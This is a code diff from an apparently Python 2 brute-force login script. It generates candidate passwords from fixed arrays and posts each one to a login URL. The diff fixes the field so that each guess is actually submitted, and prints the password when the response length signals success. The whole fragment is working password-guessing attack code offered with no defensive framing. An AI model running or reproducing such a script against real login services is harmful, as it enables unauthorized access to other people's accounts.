@@ -49,13 +49,13 @@ def verify(index, sem):
                     return
 
                 password_array[index] = '27'+password_middle[password_divi[index]+j]+password_male[m]+password_index[n]
-                login_info['password'] = password_index
+                login_info['password'] = password_array[index]
 
                 loginRequest = requests.post(request_url, data=login_info, headers=headers)
                 print password_array[index]
                 if loginRequest.headers['content-length'] >= '258':
-                    password = password_array[index]
-                    print "The password is " + password
+                    #password = password_array[index]
+                    print "The password is " + password_array[index]
                     sem.set()
                     end_time = time.time()
                     print "The time spent is " + str(end_time-start_time)
